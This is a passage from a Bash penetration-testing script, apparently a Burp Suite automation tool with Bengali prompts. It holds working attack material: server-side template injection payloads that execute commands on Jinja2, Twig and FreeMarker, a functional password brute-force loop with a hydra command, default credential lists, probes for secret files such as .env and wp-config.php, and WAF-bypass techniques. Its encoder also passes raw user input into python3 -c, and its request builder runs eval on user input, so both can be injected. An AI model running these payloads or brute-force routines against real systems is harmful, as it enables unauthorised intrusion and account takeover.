    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Detection Payloads ━━━${NC}"
    local detect=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '{{7*"7"}}' '${{7*7}}')
    for p in "${detect[@]}"; do echo -e "  ${YELLOW}▸ $p ${DIM}→ output: 49 হলে vulnerable${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Jinja2 (Python/Flask) RCE ━━━${NC}"
    local jinja=('{{config.__class__.__init__.__globals__["os"].popen("id").read()}}' "{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}" '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}')
    for p in "${jinja[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Twig (PHP) ━━━${NC}"
    local twig=('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' '{{["id"]|filter("system")}}')
    for p in "${twig[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ FreeMarker (Java) ━━━${NC}"
    echo -e '  ${RED}▸ ${"freemarker.template.utility.Execute"?new()("id")}${NC}'

    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo "$(date) | SSTI Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 20-23 — INTRUDER GUIDES
# ================================================================
mode_intruder_sniper() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          INTRUDER: SNIPER MODE GUIDE                    ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Sniper Mode কখন ব্যবহার করবেন ━━━${NC}"
    echo -e "  ${WHITE}একটি parameter এ একটি payload list test করতে${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step-by-Step ━━━${NC}"
    echo -e "  ${GREEN}1.${NC} Request intercept করুন"
    echo -e "  ${GREEN}2.${NC} Right-click → 'Send to Intruder'"
    echo -e "  ${GREEN}3.${NC} Intruder → Positions tab"
    echo -e "  ${GREEN}4.${NC} 'Clear §' button click করুন"
    echo -e "  ${GREEN}5.${NC} Target parameter select করুন, 'Add §' click করুন"
    echo -e "  ${GREEN}6.${NC} Payloads tab → Payload type: Simple list"
    echo -e "  ${GREEN}7.${NC} Payload list add করুন"
    echo -e "  ${GREEN}8.${NC} 'Start Attack' click করুন"
    echo -e "  ${GREEN}9.${NC} Status code / Length এ variation দেখুন"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Common Use Cases ━━━${NC}"
    echo -e "  ${WHITE}▸ SQLi detection: ' ; -- etc. payloads${NC}"
    echo -e "  ${WHITE}▸ XSS detection: <script>alert(1)</script> etc.${NC}"
    echo -e "  ${WHITE}▸ Password brute force: rockyou.txt${NC}"
    echo -e "  ${WHITE}▸ Directory fuzzing: wordlist.txt${NC}"
    echo ""
}

mode_intruder_clusterbomb() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          INTRUDER: CLUSTER BOMB MODE GUIDE              ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Cluster Bomb Mode কখন ব্যবহার করবেন ━━━${NC}"
    echo -e "  ${WHITE}Username + Password দুটো parameter একসাথে brute force করতে${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Step-by-Step ━━━${NC}"
    echo -e "  ${GREEN}1.${NC} Login request intercept করুন"
    echo -e "  ${GREEN}2.${NC} Send to Intruder"
    echo -e "  ${GREEN}3.${NC} Attack type: Cluster bomb"
    echo -e "  ${GREEN}4.${NC} Username field → §user§, Password → §pass§"
    echo -e "  ${GREEN}5.${NC} Payload set 1: usernames list"
    echo -e "  ${GREEN}6.${NC} Payload set 2: passwords list"
    echo -e "  ${GREEN}7.${NC} Start Attack"
    echo -e "  ${GREEN}8.${NC} ভিন্ন response length বা redirect দেখুন"
    echo ""
    echo -e "${YELLOW}[!] Community এ Rate limited — Pro version এ faster${NC}"
    echo ""
}

mode_intruder_payload_gen() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")

    echo ""
    echo -e "${CYAN}Payload list generate করবেন কোনটার জন্য?${NC}"
    echo -e "  ${GREEN}1)${NC} Username list  ${GREEN}2)${NC} Password list  ${GREEN}3)${NC} Number range  ${GREEN}4)${NC} Custom"
    read -p "$(echo -e ${YELLOW}"[1-4]: "${NC})" pch

    local out="$RESULTS_DIR/intruder_payloads_${ts}.txt"

    case $pch in
        1)
            local usernames=("admin" "administrator" "root" "user" "test" "guest" "manager" "operator" "support" "service" "info" "webmaster" "postmaster" "hostmaster" "superuser" "sysadmin")
            for u in "${usernames[@]}"; do echo "$u" >> "$out"; echo -e "  ${GREEN}▸ $u${NC}"; done ;;
        2)
            local passwords=("admin" "password" "123456" "admin123" "password123" "letmein" "qwerty" "12345678" "monkey" "dragon" "master" "sunshine" "welcome" "shadow" "superman" "iloveyou" "test" "test123" "guest" "changeme")
            for p in "${passwords[@]}"; do echo "$p" >> "$out"; echo -e "  ${GREEN}▸ $p${NC}"; done ;;
        3)
            read -p "$(echo -e ${WHITE}"Start: "${NC})" s
            read -p "$(echo -e ${WHITE}"End: "${NC})" e
            for i in $(seq "$s" "$e"); do echo "$i" >> "$out"; done
            echo -e "  ${GREEN}[✓] Numbers $s to $e generated${NC}" ;;
        4)
            read -p "$(echo -e ${WHITE}"Enter payloads (comma-separated): "${NC})" custom
            echo "$custom" | tr ',' '\n' | while IFS= read -r p; do
                p=$(echo "$p" | tr -d ' ')
                [ -n "$p" ] && echo "$p" >> "$out"
            done ;;
    esac

    echo ""
    echo -e "${GREEN}[✓] Payload list saved: $out${NC}"
    echo "$(date) | Payload Gen | $out" >> "$HISTORY_FILE"
}

mode_brute_login() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          BRUTE FORCE LOGIN HELPER                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"Login URL দিন: "${NC})" login_url
    read -p "$(echo -e ${WHITE}"Username field name: "${NC})" user_field
    read -p "$(echo -e ${WHITE}"Password field name: "${NC})" pass_field
    read -p "$(echo -e ${WHITE}"Failed login indicator (e.g. 'Invalid password'): "${NC})" fail_text
    read -p "$(echo -e ${WHITE}"Username দিন: "${NC})" username
    read -p "$(echo -e ${WHITE}"Wordlist path (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"
    [ ! -f "$wl_path" ] && echo -e "${RED}[!] Wordlist পাওয়া যায়নি।${NC}" && return

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/bruteforce_${ts}.txt"
    local found=false

    echo ""
    echo -e "${GREEN}[*] Brute force শুরু হচ্ছে...${NC}"
    echo ""

    local count=0
    while IFS= read -r password; do
        count=$((count + 1))
        local resp
        resp=$(curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            -X POST -d "${user_field}=${username}&${pass_field}=${password}" \
            -k --max-time 10 "$login_url" 2>/dev/null)

        if ! echo "$resp" | grep -qF "$fail_text"; then
            echo -e "  ${GREEN}${BOLD}[✓] Password found: $password${NC}"
            echo "Found: $username:$password" >> "$out"
            found=true
            break
        fi

        [ $((count % 10)) -eq 0 ] && echo -e "  ${DIM}[*] Tried $count passwords...${NC}"
    done < "$wl_path"

    $found || echo -e "  ${YELLOW}[!] Password পাওয়া যায়নি।${NC}"
    echo ""
    echo -e "${CYAN}💡 Hydra দিয়ে faster brute force করুন:${NC}"
    echo -e "  ${CYAN}hydra -l $username -P $wl_path $TARGET http-post-form '$login_url:$user_field=^USER^&$pass_field=^PASS^:$fail_text'${NC}"
    echo ""
    echo -e "${GREEN}[✓] Results: $out${NC}"
    echo "$(date) | Brute Login | $login_url | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 24 — HTTP REQUEST BUILDER
# ================================================================
mode_http_request_builder() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          HTTP REQUEST BUILDER                           ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"Method (GET/POST/PUT/DELETE/PATCH): "${NC})" method
    read -p "$(echo -e ${WHITE}"URL: "${NC})" req_url
    [ -z "$req_url" ] && req_url="$TARGET_URL"

    local headers=()
    echo -e "${WHITE}Headers add করুন (Enter blank করলে শেষ):${NC}"
    while true; do
        read -p "$(echo -e ${WHITE}"Header (e.g. Authorization: Bearer xxx): "${NC})" hdr
        [ -z "$hdr" ] && break
        headers+=("-H" "'$hdr'")
    done

    local data=""
    if [[ "$method" == "POST" ]] || [[ "$method" == "PUT" ]] || [[ "$method" == "PATCH" ]]; then
        read -p "$(echo -e ${WHITE}"Content-Type (Enter=application/x-www-form-urlencoded): "${NC})" ct
        [ -z "$ct" ] && ct="application/x-www-form-urlencoded"
        read -p "$(echo -e ${WHITE}"Body data: "${NC})" data
    fi

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/request_${ts}.txt"

    echo ""
    local full_cmd="curl -x http://$BURP_PROXY_HOST:$BURP_PROXY_PORT -X $method ${headers[*]}"
    [ -n "$data" ] && full_cmd="$full_cmd -H 'Content-Type: $ct' -d '$data'"
    full_cmd="$full_cmd -k -v '$req_url'"

    echo -e "${CYAN}${BOLD}━━━ Generated Command ━━━${NC}"
    echo -e "  ${CYAN}$full_cmd${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] Request পাঠাবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    eval "$full_cmd" 2>&1 | tee "$out"
    echo ""
    bangla_analysis_web "$out"
    echo -e "${GREEN}[✓] Output: $out${NC}"
    echo "$(date) | HTTP Builder | $req_url | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 25 — ACTIVE SCAN VIA CURL
# ================================================================
mode_active_scan() {
    get_proxy_config

    echo ""
    echo -e "${CYAN}[*] Target এ multiple request পাঠিয়ে scan করা হচ্ছে...${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/active_scan_${ts}.txt"

    # Common paths to check
    local paths=("/robots.txt" "/.htaccess" "/.git/HEAD" "/.env" "/config.php" "/wp-config.php" "/admin/" "/login" "/phpinfo.php" "/server-status" "/api/" "/swagger.json" "/api-docs" "/.DS_Store" "/backup.zip" "/dump.sql")

    echo -e "${CYAN}${BOLD}━━━ Common Sensitive Path Check ━━━${NC}"
    for path in "${paths[@]}"; do
        local url="${TARGET_URL}${path}"
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" \
            --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            -k --max-time 8 "$url" 2>/dev/null)

        if [ "$code" == "200" ]; then
            echo -e "  ${RED}${BOLD}[✓] $code — $url${NC}"
            echo "FOUND 200: $url" >> "$out"
        elif [ "$code" == "301" ] || [ "$code" == "302" ]; then
            echo -e "  ${YELLOW}[→] $code — $url${NC}"
            echo "REDIRECT $code: $url" >> "$out"
        elif [ "$code" == "403" ]; then
            echo -e "  ${CYAN}[!] $code — $url (exists but forbidden)${NC}"
            echo "FORBIDDEN 403: $url" >> "$out"
        else
            echo -e "  ${DIM}[✗] $code — $url${NC}"
        fi
    done

    echo ""
    bangla_analysis_web "$out"
    suggest_next_tool_web "$out"
    echo -e "${GREEN}[✓] Results: $out${NC}"
    echo "$(date) | Active Scan | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 26 — SPIDER GUIDE
# ================================================================
mode_spider_guide() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          SPIDER / CRAWL GUIDE                           ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp এ Crawl করার পদ্ধতি ━━━${NC}"
    echo -e "  ${GREEN}1.${NC} Target → Site map এ target দেখাবে"
    echo -e "  ${GREEN}2.${NC} Right-click → 'Actively scan this host' / 'Spider this host'"
    echo -e "  ${GREEN}3.${NC} Dashboard → Crawl progress দেখুন"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ curl + grep দিয়ে Links Extract ━━━${NC}"
    echo ""
    get_proxy_config
    echo ""
    echo -e "${CYAN}[*] Links extract করা হচ্ছে...${NC}"
    local links
    links=$(curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
        -k --max-time 15 "$TARGET_URL" 2>/dev/null | \
        grep -oE 'href="[^"]*"' | cut -d'"' -f2 | sort -u)

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/spider_${ts}.txt"

    if [ -n "$links" ]; then
        echo "$links" | while IFS= read -r link; do
            echo -e "  ${GREEN}▸ $link${NC}"
            echo "$link" >> "$out"
        done
        echo ""
        echo -e "${GREEN}[✓] $(wc -l < "$out") links found → $out${NC}"
    else
        echo -e "  ${YELLOW}[!] কোনো link পাওয়া যায়নি।${NC}"
    fi
    echo ""
    echo -e "${CYAN}💡 Gobuster / FFUF দিয়েও directory discover করুন:${NC}"
    echo -e "  ${CYAN}ffuf -u $TARGET_URL/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt${NC}"
    echo "$(date) | Spider | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 27 — SCOPE CONFIG
# ================================================================
mode_scope_config() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          BURP SCOPE CONFIG GENERATOR                    ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/scope_config_${ts}.json"

    echo -e "${WHITE}Scope এ যোগ করবেন কোন domains?${NC}"
    echo -e "${DIM}একটা একটা করে দিন, শেষ হলে 'done':${NC}"

    local domains=()
    while true; do
        read -p "$(echo -e ${WHITE}"Domain: "${NC})" d
        [[ "$d" == "done" || -z "$d" ]] && break
        domains+=("$d")
    done

    if [ ${#domains[@]} -eq 0 ]; then
        echo -e "${RED}[!] কোনো domain দেওয়া হয়নি।${NC}"
        return
    fi

    # Generate scope JSON
    echo '{"target":{"scope":{"include":[' > "$out"
    local first=true
    for domain in "${domains[@]}"; do
        $first || echo ',' >> "$out"
        first=false
        echo "{\"enabled\":true,\"file\":\"\",\"host\":\"$domain\",\"port\":\"^(80|443|8080|8443)$\",\"protocol\":\"any\"}" >> "$out"
    done
    echo ']}}}' >> "$out"

    echo ""
    echo -e "${GREEN}[✓] Scope config generated: $out${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp এ Import করুন ━━━${NC}"
    echo -e "  ${WHITE}Project → Save → Load project options → $out${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Scope কেন দরকার? ━━━${NC}"
    echo -e "  ${WHITE}→ Out-of-scope traffic intercept না করতে${NC}"
    echo -e "  ${WHITE}→ Scanner শুধু in-scope request test করবে${NC}"
    echo -e "  ${WHITE}→ Site map তে শুধু in-scope দেখাবে${NC}"
    echo ""
    echo "$(date) | Scope Config | ${domains[*]} | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 28 — SSL STRIP TEST
# ================================================================
mode_ssl_strip() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          SSL/HTTPS SECURITY CHECK                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/ssl_check_${ts}.txt"

    echo -e "${CYAN}[*] HTTP → HTTPS redirect check...${NC}"
    local http_resp
    http_resp=$(curl -s -o /dev/null -w "%{http_code}|%{redirect_url}" \
        --max-time 8 "http://$TARGET:$TARGET_PORT" 2>/dev/null)
    local http_code; http_code=$(echo "$http_resp" | cut -d'|' -f1)
    local redirect_url; redirect_url=$(echo "$http_resp" | cut -d'|' -f2)

    echo -e "  ${WHITE}HTTP Status: ${CYAN}$http_code${NC}"
    if echo "$redirect_url" | grep -q "^https://"; then
        echo -e "  ${GREEN}[✓] HTTP → HTTPS redirect আছে${NC}"
    else
        echo -e "  ${RED}[!] HTTPS redirect নেই! SSL Strip সম্ভব!${NC}"
    fi
    echo "HTTP Status: $http_code | Redirect: $redirect_url" >> "$out"

    echo ""
    echo -e "${CYAN}[*] HSTS check...${NC}"
    local hsts
    hsts=$(curl -s -I --max-time 8 "https://$TARGET" 2>/dev/null | grep -i "Strict-Transport-Security")
    if [ -n "$hsts" ]; then
        echo -e "  ${GREEN}[✓] HSTS set: $hsts${NC}"
    else
        echo -e "  ${RED}[!] HSTS নেই — Downgrade attack সম্ভব!${NC}"
    fi
    echo "HSTS: ${hsts:-NOT SET}" >> "$out"

    echo ""
    echo -e "${CYAN}[*] Mixed content check...${NC}"
    local page_http
    page_http=$(curl -s --max-time 10 "https://$TARGET" 2>/dev/null | grep -i "src=\"http:" | head -5)
    if [ -n "$page_http" ]; then
        echo -e "  ${YELLOW}[!] Mixed content পাওয়া গেছে:${NC}"
        echo "$page_http" | while IFS= read -r line; do echo -e "  ${YELLOW}▸ $line${NC}"; done
    else
        echo -e "  ${GREEN}[✓] Mixed content নেই${NC}"
    fi

    echo ""
    echo -e "${GREEN}[✓] SSL check results: $out${NC}"
    echo "$(date) | SSL Check | $TARGET | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 29 — CERT INFO
# ================================================================
mode_cert_info() {
    echo ""
    echo -e "${CYAN}[*] SSL Certificate info: $TARGET:${TARGET_PORT:-443}${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/cert_info_${ts}.txt"

    if command -v openssl &>/dev/null; then
        echo "" | openssl s_client -connect "$TARGET:${TARGET_PORT:-443}" -servername "$TARGET" 2>/dev/null | \
            openssl x509 -noout -text 2>/dev/null | \
            grep -E "Subject:|Issuer:|Not Before:|Not After:|DNS:|Subject Alternative Name" | \
            head -20 | while IFS= read -r line; do
                echo -e "  ${CYAN}$line${NC}"
                echo "$line" >> "$out"
            done
    fi

    echo ""
    echo -e "${CYAN}💡 SSLScan দিয়ে বিস্তারিত দেখুন:${NC}"
    echo -e "  ${CYAN}sslscan $TARGET${NC}"
    echo ""
    echo -e "${GREEN}[✓] Cert info: $out${NC}"
    echo "$(date) | Cert Info | $TARGET | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 30 — SECURITY HEADERS CHECK
# ================================================================
mode_security_headers() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          HTTPS SECURITY HEADERS AUDIT                   ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/sec_headers_${ts}.txt"

    local headers
    headers=$(curl -s -I --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
        -k --max-time 10 "$TARGET_URL" 2>/dev/null)

    local score=0 total=7

    echo -e "  ${WHITE}${BOLD}Response Headers:${NC}"
    echo "$headers" | head -20 | while IFS= read -r line; do echo -e "  ${DIM}$line${NC}"; done
    echo ""

    echo -e "  ${CYAN}${BOLD}━━━ Security Header Analysis ━━━${NC}"
    echo ""

    declare -A sec_headers=(
        ["Strict-Transport-Security"]="HSTS — HTTPS enforce করে"
        ["Content-Security-Policy"]="CSP — XSS থেকে রক্ষা করে"
        ["X-Frame-Options"]="Clickjacking থেকে রক্ষা করে"
        ["X-Content-Type-Options"]="MIME sniffing থেকে রক্ষা করে"
        ["Referrer-Policy"]="Referrer information control করে"
        ["Permissions-Policy"]="Browser feature control করে"
        ["X-XSS-Protection"]="XSS filter (deprecated কিন্তু useful)"
    )

    for header in "${!sec_headers[@]}"; do
        local desc="${sec_headers[$header]}"
        if echo "$headers" | grep -qi "^$header:"; then
            local val; val=$(echo "$headers" | grep -i "^$header:" | head -1)
            echo -e "  ${GREEN}[✓] $header${NC}"
            echo -e "     ${DIM}$val${NC}"
            echo "[PASS] $header: $val" >> "$out"
            score=$((score + 1))
        else
            echo -e "  ${RED}[✗] $header MISSING${NC}"
            echo -e "     ${WHITE}→ $desc${NC}"
            echo "[FAIL] $header: MISSING — $desc" >> "$out"
        fi
        echo ""
    done

    echo -e "  ${CYAN}${BOLD}━━━ Security Score ━━━${NC}"
    echo -e "  ${WHITE}Score: ${score}/${total}${NC}"
    if [ "$score" -ge 6 ]; then
        echo -e "  ${GREEN}  ██████████ EXCELLENT — Security headers ভালো configure করা${NC}"
    elif [ "$score" -ge 4 ]; then
        echo -e "  ${YELLOW}  ███████░░░ GOOD — কিছু improvement দরকার${NC}"
    elif [ "$score" -ge 2 ]; then
        echo -e "  ${CYAN}  █████░░░░░ MEDIUM — অনেক headers missing${NC}"
    else
        echo -e "  ${RED}  ███░░░░░░░ POOR — Security headers প্রায় নেই!${NC}"
    fi

    echo ""
    echo -e "${GREEN}[✓] Report: $out${NC}"
    echo "$(date) | Sec Headers | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 31 — VULNERABILITY REPORT TEMPLATE
# ================================================================
mode_vuln_report() {
    echo ""
    read -p "$(echo -e ${WHITE}"Vulnerability name দিন: "${NC})" vuln_name
    read -p "$(echo -e ${WHITE}"Severity (Critical/High/Medium/Low/Info): "${NC})" severity
    read -p "$(echo -e ${WHITE}"Affected URL/Parameter: "${NC})" affected
    read -p "$(echo -e ${WHITE}"Brief description: "${NC})" description

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/vuln_report_${ts}.txt"

    {
        echo "================================================================"
        echo "  VULNERABILITY REPORT"
        echo "  Generated by SAIMUM's Burp Suite Automation Tool"
        echo "  Date: $(date)"
        echo "================================================================"
        echo ""
        echo "VULNERABILITY TITLE: $vuln_name"
        echo "SEVERITY: $severity"
        echo "AFFECTED TARGET: $TARGET_URL"
        echo "AFFECTED URL/PARAMETER: $affected"
        echo ""
        echo "DESCRIPTION:"
        echo "$description"
        echo ""
        echo "STEPS TO REPRODUCE:"
        echo "1. [Describe steps here]"
        echo "2. "
        echo "3. "
        echo ""
        echo "PROOF OF CONCEPT (PoC):"
        echo "[Payload / Screenshot / Request-Response here]"
        echo ""
        echo "IMPACT:"
        case "$severity" in
            Critical) echo "This vulnerability allows an attacker to [complete system compromise]." ;;
            High)     echo "This vulnerability allows an attacker to [significant data exposure or system damage]." ;;
            Medium)   echo "This vulnerability allows an attacker to [limited impact]." ;;
            Low)      echo "This vulnerability has minimal security impact." ;;
            Info)     echo "This is an informational finding with no direct security impact." ;;
        esac
        echo ""
        echo "REMEDIATION:"
        echo "1. [Fix recommendation here]"
        echo "2. "
        echo ""
        echo "REFERENCES:"
        echo "- OWASP: https://owasp.org"
        echo "- CWE: https://cwe.mitre.org"
        echo ""
        echo "================================================================"
    } | tee "$out"

    echo ""
    echo -e "${GREEN}[✓] Report template: $out${NC}"
    echo "$(date) | Vuln Report | $vuln_name | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 32 — EXTENSION SUGGESTIONS
# ================================================================
mode_extensions() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          BURP SUITE USEFUL EXTENSIONS                   ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Essential Extensions ━━━${NC}"
    echo -e "  ${RED}${BOLD}▸ JWT Editor${NC}     — JWT token manipulation ও attack"
    echo -e "  ${RED}${BOLD}▸ Autorize${NC}       — Authorization/IDOR testing automated"
    echo -e "  ${RED}${BOLD}▸ ParamMiner${NC}     — Hidden parameter discovery"
    echo -e "  ${RED}${BOLD}▸ ActiveScan++${NC}   — Enhanced vulnerability scanning"
    echo -e "  ${RED}${BOLD}▸ Turbo Intruder${NC} — High-speed Intruder (race condition)"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Recon Extensions ━━━${NC}"
    echo -e "  ${YELLOW}▸ Burp Bounty${NC}     — Bug bounty profile-based scanning"
    echo -e "  ${YELLOW}▸ GAP${NC}             — Endpoint discovery ও parameter analysis"
    echo -e "  ${YELLOW}▸ JS Miner${NC}        — JavaScript এ secrets/endpoints খোঁজা"
    echo -e "  ${YELLOW}▸ Retire.js${NC}       — Vulnerable JS library detection"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Exploitation Extensions ━━━${NC}"
    echo -e "  ${GREEN}▸ CSRF Scanner${NC}    — CSRF vulnerability auto-detection"
    echo -e "  ${GREEN}▸ HTTP Request Smuggler${NC} — HTTP smuggling testing"
    echo -e "  ${GREEN}▸ Hackvertor${NC}      — Encoding/decoding transformations"
    echo -e "  ${GREEN}▸ Upload Scanner${NC}  — File upload vulnerability testing"
    echo -e "  ${GREEN}▸ SHELLING${NC}        — Command injection testing"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Install করুন ━━━${NC}"
    echo -e "  ${WHITE}Burp → Extensions → BApp Store → Search → Install${NC}"
    echo ""
}

# ================================================================
# MODE 33 — WAF BYPASS
# ================================================================
mode_waf_bypass() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/waf_bypass_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          WAF BYPASS TECHNIQUES                          ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Encoding Bypass ━━━${NC}"
    echo -e "  ${YELLOW}▸ URL encoding: %27 = ', %3C = <, %3E = >${NC}"
    echo -e "  ${YELLOW}▸ Double encoding: %2527 = %27 = '${NC}"
    echo -e "  ${YELLOW}▸ Unicode: \\u003c = <, \\u003e = >${NC}"
    echo -e "  ${YELLOW}▸ HTML entities: &#x27; = ', &#60; = <${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Case Variation ━━━${NC}"
    echo -e "  ${GREEN}▸ sElEcT, UnIoN, ScRiPt, aLeRt${NC}"
    echo -e "  ${GREEN}▸ SELECT/**/ , UNION/**/SELECT${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Comment Injection ━━━${NC}"
    echo -e "  ${GREEN}▸ SEL/**/ECT, UN/**/ION${NC}"
    echo -e "  ${GREEN}▸ SELECT/*!32302 */1${NC}"
    echo -e "  ${GREEN}▸ <scr/**/ipt>alert(1)</scr/**/ipt>${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ HTTP Header Manipulation ━━━${NC}"
    echo -e "  ${WHITE}▸ X-Forwarded-For: 127.0.0.1${NC}"
    echo -e "  ${WHITE}▸ X-Real-IP: 127.0.0.1${NC}"
    echo -e "  ${WHITE}▸ X-Originating-IP: 127.0.0.1${NC}"
    echo -e "  ${WHITE}▸ X-Remote-IP: 127.0.0.1${NC}"
    echo -e "  ${WHITE}▸ X-Client-IP: 127.0.0.1${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Burp এ WAF Bypass ━━━${NC}"
    echo -e "  ${WHITE}1. Repeater এ payload manually encode করুন${NC}"
    echo -e "  ${WHITE}2. Hackvertor extension দিয়ে transform করুন${NC}"
    echo -e "  ${WHITE}3. Intruder এ encoded payload list ব্যবহার করুন${NC}"
    echo ""

    echo -e "${GREEN}[✓] Guide saved: $out${NC}"
    echo "$(date) | WAF Bypass | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 34 — ENCODER/DECODER
# ================================================================
mode_encoder() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          REQUEST/RESPONSE ENCODER                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"Text/Payload দিন: "${NC})" input_text

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Encoded Versions ━━━${NC}"

    if command -v python3 &>/dev/null; then
        echo -e "  ${WHITE}URL Encoded:${NC}"
        echo -e "  ${GREEN}$(python3 -c "import urllib.parse; print(urllib.parse.quote('$input_text', safe=''))")${NC}"
        echo ""
        echo -e "  ${WHITE}Double URL Encoded:${NC}"
